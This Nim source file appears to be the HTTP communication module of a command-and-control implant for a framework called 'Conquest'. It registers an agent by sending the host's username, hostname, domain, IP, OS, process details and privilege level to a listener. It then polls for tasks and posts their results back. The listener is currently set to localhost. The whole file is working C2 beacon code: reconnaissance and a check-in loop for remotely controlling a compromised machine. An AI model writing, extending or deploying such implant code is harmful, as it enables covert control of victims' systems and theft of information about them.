import httpclient, json, strformat, asyncdispatch

import ./[types, agentinfo]

proc register*(listener: string): string = 

    let client = newAsyncHttpClient()

    # Define headers
    client.headers = newHttpHeaders({ "Content-Type": "application/json" })
    
    # Create registration payload
    let body = %*{
        "username": getUsername(),
        "hostname":getHostname(),
        "domain": getDomain(),
        "ip": getIPv4Address(),
        "os": getOSVersion(),
        "process": getProcessExe(),
        "pid":  getProcessId(),
        "elevated": isElevated()
    }
    echo $body

    try:
        # Register agent to the Conquest server
        return waitFor client.postContent(fmt"http://localhost:5555/{listener}/register", $body)
    except CatchableError as err:
        echo "[-] [register]:", err.msg
        quit(0)
    finally:
        client.close()

proc getTasks*(listener: string, agent: string): seq[Task] = 

    let client = newAsyncHttpClient()

    try:
        # Register agent to the Conquest server
        let responseBody = waitFor client.getContent(fmt"http://localhost:5555/{listener}/{agent}/tasks")
        return parseJson(responseBody).to(seq[Task])

    except CatchableError as err:
        # When the listener is not reachable, don't kill the application, but check in at the next time
        echo "[-] [getTasks]:", err.msg
    finally:
        client.close()

    return @[]

proc postResults*(listener, agent: string, task: Task): bool = 
    
    let client = newAsyncHttpClient()

    # Define headers
    client.headers = newHttpHeaders({ "Content-Type": "application/json" })
    
    let taskJson = %task

    echo $taskJson

    try:
        # Register agent to the Conquest server
        discard waitFor client.postContent(fmt"http://localhost:5555/{listener}/{agent}/{task.id}/results", $taskJson)
    except CatchableError as err:
        # When the listener is not reachable, don't kill the application, but check in at the next time
        echo "[-] [postResults]: ", err.msg
    finally:
        client.close()

    return true